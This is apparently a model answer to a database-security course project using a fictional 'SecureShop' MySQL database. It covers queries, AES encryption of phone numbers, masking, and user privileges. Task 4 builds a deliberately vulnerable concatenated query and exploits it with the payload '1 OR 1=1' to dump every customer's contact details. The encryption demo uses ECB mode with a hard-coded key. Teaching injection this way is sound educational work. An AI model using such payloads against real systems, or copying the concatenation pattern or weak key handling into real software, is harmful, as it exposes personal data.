# *Database Essentials and Vulnerabilities* Final Project
You have been hired as a database security consultant for SecureShop, an online retail company. SecureShop is looking to upgrade its database to enhance security and data management practices. The company's database needs to handle sensitive information, including customer personal data, order details, and payment information, while ensuring compliance with data protection regulations.

---
## Task 1: Database design and implementation
### Scenario
This task involves exploring the SecureShop database to understand its structure and contents. The database includes tables for customers, orders, products, and payment details. Your goal is to import this database into your MySQL environment and perform basic SQL queries to retrieve and analyze the data. By executing these queries, you'll gain insights into the various aspects of the database and how different data elements are interrelated.
### Tasks:
#### 1.1: Import the database
##### 1.1.1: Create a database "SecureShop". Import the schema and data from the attached `.sql` file and show the output.
```sql
CREATE DATABASE SecureShop
CHARACTER SET utf8mb4
COLLATE utf8mb4_0900_ai_ci;

USE SecureShop;

SOURCE ./SecureShop.sql
```
Output:
```text
Query OK, 1 row affected

Database changed

The SOURCE command reports a series of successful DROP, CREATE, INSERT, ALTER, LOCK, and SET operations
```
Verify that the import produced all four tables:
```sql
SHOW TABLES;
```
Output:

| Tables_in_SecureShop |
| -------------------- |
| customers            |
| orders               |
| payment_details      |
| products             |
Verify the imported row counts:
```sql
SELECT 'customers' AS table_name, COUNT(*) AS row_count
FROM customers
UNION ALL
SELECT 'orders', COUNT(*)
FROM orders
UNION ALL
SELECT 'payment_details', COUNT(*)
FROM payment_details
UNION ALL
SELECT 'products', COUNT(*)
FROM products;
```
Output:

| table_name | row_count |
| --- | ---: |
| customers | 10 |
| orders | 10 |
| payment_details | 10 |
| products | 10 |
#### 1.2: Perform the following basic SQL exercises:
##### 1.2.1: Explore the tables in the database and show the output of the payment_details table.
```sql
SHOW TABLES;

SELECT *
FROM payment_details
ORDER BY payment_id;
```
Output:

| payment_id | order_id | payment_date | payment_method | payment_amount |
| ---: | ---: | --- | --- | ---: |
| 1 | 1 | 2024-08-01 | Credit Card | 1499.97 |
| 2 | 2 | 2024-08-02 | PayPal | 899.98 |
| 3 | 3 | 2024-08-03 | Credit Card | 1299.97 |
| 4 | 4 | 2024-08-04 | Credit Card | 499.98 |
| 5 | 5 | 2024-08-05 | Debit Card | 169.99 |
| 6 | 6 | 2024-08-06 | Credit Card | 2399.95 |
| 7 | 7 | 2024-08-07 | PayPal | 399.99 |
| 8 | 8 | 2024-08-08 | Credit Card | 349.98 |
| 9 | 9 | 2024-08-09 | Debit Card | 1099.99 |
| 10 | 10 | 2024-08-10 | Credit Card | 289.98 |
##### 1.2.2: Search for all customers in the customers table and show the output.
```sql
SELECT *
FROM customers
ORDER BY customer_id;
```
Output:

| customer_id | first_name | last_name | email | phone | address | city | state | postal_code | country |
| ---: | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | John | Doe | john.doe@example.com | 123-456-7890 | 123 Elm St | New York | NY | 10001 | USA |
| 2 | Jane | Smith | jane.smith@example.com | 987-654-3210 | 456 Oak St | Los Angeles | CA | 90001 | USA |
| 3 | Michael | Brown | michael.brown@example.com | 555-123-4567 | 789 Pine St | Chicago | IL | 60601 | USA |
| 4 | Emily | Davis | emily.davis@example.com | 444-555-6666 | 101 Maple St | Houston | TX | 77001 | USA |
| 5 | David | Wilson | david.wilson@example.com | 333-444-5555 | 202 Birch St | Phoenix | AZ | 85001 | USA |
| 6 | Sarah | Johnson | sarah.johnson@example.com | 111-222-3333 | 303 Cedar St | Philadelphia | PA | 19101 | USA |
| 7 | James | Williams | james.williams@example.com | 666-777-8888 | 404 Spruce St | San Antonio | TX | 78201 | USA |
| 8 | Olivia | Martinez | olivia.martinez@example.com | 999-000-1111 | 505 Cherry St | San Diego | CA | 92101 | USA |
| 9 | William | Garcia | william.garcia@example.com | 222-333-4444 | 606 Aspen St | Dallas | TX | 75201 | USA |
| 10 | Isabella | Rodriguez | isabella.rodriguez@example.com | 777-888-9999 | 707 Redwood St | San Jose | CA | 95101 | USA |
##### 1.2.3: List all products in the products table and show the output.
```sql
SELECT *
FROM products
ORDER BY product_id;
```
Output:

| product_id | product_name | product_description | price | stock_quantity |
| ---: | --- | --- | ---: | ---: |
| 1 | Laptop | High-performance laptop | 999.99 | 50 |
| 2 | Smartphone | Latest model smartphone | 699.99 | 100 |
| 3 | Tablet | 10-inch screen tablet | 299.99 | 75 |
| 4 | Smartwatch | Smartwatch with fitness tracking | 199.99 | 200 |
| 5 | Headphones | Noise-cancelling headphones | 149.99 | 150 |
| 6 | Camera | Digital camera with 4K video | 499.99 | 30 |
| 7 | Printer | Wireless color printer | 129.99 | 40 |
| 8 | Monitor | 27-inch 4K monitor | 399.99 | 25 |
| 9 | Keyboard | Mechanical keyboard | 89.99 | 80 |
| 10 | Mouse | Wireless ergonomic mouse | 49.99 | 100 |
##### 1.2.4: Retrieve payment details for order_id 7 and show the output.
```sql
SELECT *
FROM payment_details
WHERE order_id = 7;
```
Output:

| payment_id | order_id | payment_date | payment_method | payment_amount |
| ---: | ---: | --- | --- | ---: |
| 7 | 7 | 2024-08-07 | PayPal | 399.99 |

##### 1.2.5: Find orders placed by the customer named David and show the output.
```sql
SELECT
    o.order_id,
    c.first_name,
    c.last_name,
    o.order_date,
    o.total_amount
FROM orders AS o
JOIN customers AS c
    ON c.customer_id = o.customer_id
WHERE c.first_name = 'David'
ORDER BY o.order_id;
```
Output:

| order_id | first_name | last_name | order_date | total_amount |
| ---: | --- | --- | --- | ---: |
| 5 | David | Wilson | 2024-08-05 | 169.99 |

---
## Task 2: Data protection strategies
### Scenario
**Scenario:** SecureShop is committed to safeguarding sensitive customer information. As part of their data protection strategy, the company has identified the need to implement encryption for certain fields in their database to prevent unauthorized access. Additionally, they aim to mask personal information to enhance privacy while still allowing some data visibility for operational purposes.

**Encryption implementation:** Although the SecureShop database currently does not have fields specifically designated for encryption, imagine that you need to protect sensitive data such as payment information. You are required to demonstrate how you would encrypt this data if it were present in the database.

**Masking personal information:** SecureShop wants to mask phone numbers in their customer records to ensure that only partial information is visible. This helps protect customer privacy while still allowing staff to identify and contact customers when necessary.
### Tasks
#### 2.1: Encrypt and decrypt sensitive data
##### 2.1.1: Use MySQL's built-in functions to encrypt customer personal information (phone number). Show the output of the encrypted data.
This lab procedure preserves the source table and writes ciphertext to a temporary table. The temporary table disappears when the session ends.
```sql
SET SESSION block_encryption_mode = 'aes-128-ecb';

SET @demo_key = UNHEX('F3229A0B371ED2D9441B830D21A390C3');

CREATE TEMPORARY TABLE encrypted_phone_demo (
    customer_id INT PRIMARY KEY,
    encrypted_phone VARBINARY(64) NOT NULL
);

INSERT INTO encrypted_phone_demo (
    customer_id,
    encrypted_phone
)
SELECT
    customer_id,
    AES_ENCRYPT(phone, @demo_key)
FROM customers
WHERE phone IS NOT NULL;
```
Output:
```text
Query OK, 10 rows affected
Records: 10  Duplicates: 0  Warnings: 0
```
Display the binary ciphertext in hexadecimal form:

```sql
SELECT
    e.customer_id,
    c.first_name,
    HEX(e.encrypted_phone) AS encrypted_phone
FROM encrypted_phone_demo AS e
JOIN customers AS c
    ON c.customer_id = e.customer_id
ORDER BY e.customer_id;
```
Output:

| customer_id | first_name | encrypted_phone |
| ---: | --- | --- |
| 1 | John | 4421022407BC13898ED9EDA6AC27CC43 |
| 2 | Jane | BA9D67491F22BB522850CFF557432476 |
| 3 | Michael | C167E0A64B8BE58F6CDD29BDCB428A60 |
| 4 | Emily | A426EB0ACE6885598C431DF43994AB52 |
| 5 | David | 695F4C91FC7F0687D0C47D00A3A46670 |
| 6 | Sarah | 8FC3C9D700EA4E9A054B2CD5A4799C80 |
| 7 | James | 7A29CD979D632F18204F015293052A20 |
| 8 | Olivia | AD51E4FBE494043E566FC0468967933B |
| 9 | William | 808B33AB8B12AD853D7BF8CFC1D770C2 |
| 10 | Isabella | A2EF2D6DD91767C8B96A43B85DC19610 |
##### 2.1.2: Use MySQL's built-in functions to decrypt the data encrypted in the previous exercise. Show the output of the decrypted data.
Run the decryption in the same session so the temporary table and `@demo_key` remain available.

```sql
SELECT
    e.customer_id,
    c.first_name,
    CONVERT(
        AES_DECRYPT(e.encrypted_phone, @demo_key)
        USING utf8mb4
    ) AS decrypted_phone
FROM encrypted_phone_demo AS e
JOIN customers AS c
    ON c.customer_id = e.customer_id
ORDER BY e.customer_id;
```
Output:

| customer_id | first_name | decrypted_phone |
| ----------: | ---------- | --------------- |
|           1 | John       | 123-456-7890    |
|           2 | Jane       | 987-654-3210    |
|           3 | Michael    | 555-123-4567    |
|           4 | Emily      | 444-555-6666    |
|           5 | David      | 333-444-5555    |
|           6 | Sarah      | 111-222-3333    |
|           7 | James      | 666-777-8888    |
|           8 | Olivia     | 999-000-1111    |
|           9 | William    | 222-333-4444    |
|          10 | Isabella   | 777-888-9999    |
Validate every decrypted value matches the original fixture value:

```sql
SELECT COUNT(*) AS matching_rows
FROM encrypted_phone_demo AS e
JOIN customers AS c
    ON c.customer_id = e.customer_id
WHERE CONVERT(
    AES_DECRYPT(e.encrypted_phone, @demo_key)
    USING utf8mb4
) = c.phone;
```
Output:

| matching_rows |
| ------------: |
|            10 |
#### 2.2: Apply data masking
Mask sensitive information when displaying it. Use SQL functions to partially mask data, showing only the last two digits of a customer's postal code. Take screenshots of the output showing the masked field.
##### Answer
The expression below preserves `NULL`, masks every character except the final two, and handles values shorter than two characters.

```sql
SELECT
    customer_id,
    first_name,
    last_name,
    CASE
        WHEN postal_code IS NULL THEN NULL
        ELSE CONCAT(
            REPEAT(
                '*',
                GREATEST(CHAR_LENGTH(postal_code) - 2, 0)
            ),
            SUBSTRING(postal_code, -2)
        )
    END AS masked_postal_code
FROM customers
ORDER BY customer_id;
```
Output:

| customer_id | first_name | last_name | masked_postal_code |
| ---: | --- | --- | --- |
| 1 | John | Doe | `***01` |
| 2 | Jane | Smith | `***01` |
| 3 | Michael | Brown | `***01` |
| 4 | Emily | Davis | `***01` |
| 5 | David | Wilson | `***01` |
| 6 | Sarah | Johnson | `***01` |
| 7 | James | Williams | `***01` |
| 8 | Olivia | Martinez | `***01` |
| 9 | William | Garcia | `***01` |
| 10 | Isabella | Rodriguez | `***01` |

---
## Task 3: Database security and user management
### Scenario
SecureShop wants to set up a basic user management system. For this task, you will create a single user role with specific permissions. This user will be a "Delivery Executive (DE)" who needs to access and update customer records.
### Tasks
#### 3.1: GRANT and REVOKE Permissions
##### 3.1.1: Write and execute SQL commands to create a "Delivery Executive" user and show the output.
The technical account name is `delivery_executive`. The password below is a lab placeholder and should be replaced before execution.

```sql
CREATE USER 'delivery_executive'@'localhost'
IDENTIFIED BY 'hunter2hunter2hunter2';
```
Output:
```text
Query OK, 0 rows affected
```
Verify the newly created account:

```sql
SHOW GRANTS FOR 'delivery_executive'@'localhost';
```
Output:

```text
GRANT USAGE ON *.* TO `delivery_executive`@`localhost`
```
##### 3.1.2: Grant the SELECT, DELETE, and UPDATE permission to "Delivery Executive" and verify the access provided.
Limit the privileges to the `customers` table because the job function does not require database-wide access.
```sql
GRANT SELECT, UPDATE, DELETE
ON SecureShop.customers
TO 'delivery_executive'@'localhost';

SHOW GRANTS FOR 'delivery_executive'@'localhost';
```
Output:
```text
GRANT USAGE ON *.* TO `delivery_executive`@`localhost`
GRANT SELECT, UPDATE, DELETE ON `SecureShop`.`customers` TO `delivery_executive`@`localhost`
```
Open a separate session as the Delivery Executive account:
```text
mysql -u delivery_executive -p SecureShop
```
Verify `SELECT`:
```sql
SELECT
    customer_id,
    first_name,
    last_name,
    city,
    postal_code
FROM customers
WHERE customer_id = 1;
```
Output:

| customer_id | first_name | last_name | city     | postal_code |
| ----------: | ---------- | --------- | -------- | ----------- |
|           1 | John       | Doe       | New York | 10001       |

Verify `UPDATE` inside a transaction, then roll back the test change:

```sql
START TRANSACTION;

UPDATE customers
SET city = 'Temporary Test City'
WHERE customer_id = 1;

SELECT
    customer_id,
    city
FROM customers
WHERE customer_id = 1;

ROLLBACK;

SELECT
    customer_id,
    city
FROM customers
WHERE customer_id = 1;
```

Output:
```text
Query OK, 1 row affected
Rows matched: 1  Changed: 1  Warnings: 0
```

The first `SELECT` returns `Temporary Test City`. The second `SELECT`, after `ROLLBACK`, returns the original value `New York`.

Verify `DELETE` safely by targeting a primary key that is absent from the fixture data:

```sql
DELETE FROM customers
WHERE customer_id = -1;
```

Output:
```text
Query OK, 0 rows affected
```
##### 3.1.3: Revoke the DELETE permission from "Delivery Executive" and verify the access provided.
Run the revocation from the administrative session:
```sql
REVOKE DELETE
ON SecureShop.customers
FROM 'delivery_executive'@'localhost';

SHOW GRANTS FOR 'delivery_executive'@'localhost';
```

Output:

```text
GRANT USAGE ON *.* TO `delivery_executive`@`localhost`
GRANT SELECT, UPDATE ON `SecureShop`.`customers` TO `delivery_executive`@`localhost`
```

Reconnect as `delivery_executive`, then repeat the safe deletion test:

```sql
DELETE FROM customers
WHERE customer_id = -1;
```

Output:

```text
ERROR 1142 (42000): DELETE command denied to user 'delivery_executive'@'localhost' for table 'customers'
```
---
## Task 4: Injection vulnerabilities
### Scenario
In this task, you'll explore potential SQL injection vulnerabilities within the SecureShop database. SQL injection is a significant security threat where an attacker can manipulate SQL queries by injecting malicious input. Your objective is to identify areas in the database where SQL injection could be possible, particularly in queries that interact with the customers table.
### Tasks
#### 4.1: Writing a vulnerable SQL query
Identifying a vulnerable query: Write and execute vulnerable SQL query that joins the orders and customers tables and fetches customer details using user input, such as `order_id`, which is directly included in the SQL statement. Show the output.
##### Answer
The query below concatenates untrusted numeric input into SQL text before parsing.
```sql
SET @order_id_input = '1';

SET @vulnerable_sql = CONCAT(
    'SELECT o.order_id, c.customer_id, c.first_name, ',
    'c.last_name, c.email, c.phone ',
    'FROM orders AS o ',
    'JOIN customers AS c ON c.customer_id = o.customer_id ',
    'WHERE o.order_id = ',
    @order_id_input,
    ' ORDER BY o.order_id'
);

SELECT @vulnerable_sql AS constructed_query;

PREPARE vulnerable_order_lookup
FROM @vulnerable_sql;

EXECUTE vulnerable_order_lookup;

DEALLOCATE PREPARE vulnerable_order_lookup;
```

The constructed query is:
```sql
SELECT
    o.order_id,
    c.customer_id,
    c.first_name,
    c.last_name,
    c.email,
    c.phone
FROM orders AS o
JOIN customers AS c
    ON c.customer_id = o.customer_id
WHERE o.order_id = 1
ORDER BY o.order_id
```

Dataset-derived expected output for normal input:

| order_id | customer_id | first_name | last_name | email                | phone        |
| -------: | ----------: | ---------- | --------- | -------------------- | ------------ |
|        1 |           1 | John       | Doe       | john.doe@example.com | 123-456-7890 |
The query is vulnerable because the application inserts the input into executable SQL text. Preparing the already concatenated string does not restore the separation between code and data.
#### 4.2: Exploiting the vulnerable SQL query using SQL Injection
SQL injection: Write and execute an SQL injection attack using vulnerable query created in Task 4.1 to retrieve unauthorized data. Show the output.
##### Answer
Use the non-destructive, read-only test value supplied by the assignment:
```text
1 OR 1=1
```
Run the same construction with the altered input:
```sql
SET @order_id_input = '1 OR 1=1';

SET @vulnerable_sql = CONCAT(
    'SELECT o.order_id, c.customer_id, c.first_name, ',
    'c.last_name, c.email, c.phone ',
    'FROM orders AS o ',
    'JOIN customers AS c ON c.customer_id = o.customer_id ',
    'WHERE o.order_id = ',
    @order_id_input,
    ' ORDER BY o.order_id'
);

SELECT @vulnerable_sql AS constructed_query;

PREPARE vulnerable_order_lookup
FROM @vulnerable_sql;

EXECUTE vulnerable_order_lookup;

DEALLOCATE PREPARE vulnerable_order_lookup;
```
The manipulated query becomes:
```sql
SELECT
    o.order_id,
    c.customer_id,
    c.first_name,
    c.last_name,
    c.email,
    c.phone
FROM orders AS o
JOIN customers AS c
    ON c.customer_id = o.customer_id
WHERE o.order_id = 1 OR 1=1
ORDER BY o.order_id
```
Dataset-derived expected filter-expansion output:

| order_id | customer_id | first_name | last_name | email | phone |
| ---: | ---: | --- | --- | --- | --- |
| 1 | 1 | John | Doe | john.doe@example.com | 123-456-7890 |
| 2 | 2 | Jane | Smith | jane.smith@example.com | 987-654-3210 |
| 3 | 3 | Michael | Brown | michael.brown@example.com | 555-123-4567 |
| 4 | 4 | Emily | Davis | emily.davis@example.com | 444-555-6666 |
| 5 | 5 | David | Wilson | david.wilson@example.com | 333-444-5555 |
| 6 | 6 | Sarah | Johnson | sarah.johnson@example.com | 111-222-3333 |
| 7 | 7 | James | Williams | james.williams@example.com | 666-777-8888 |
| 8 | 8 | Olivia | Martinez | olivia.martinez@example.com | 999-000-1111 |
| 9 | 9 | William | Garcia | william.garcia@example.com | 222-333-4444 |
| 10 | 10 | Isabella | Rodriguez | isabella.rodriguez@example.com | 777-888-9999 |

The expression `1=1` is true for every joined row. The altered condition therefore expands one intended result to all 10 customer records.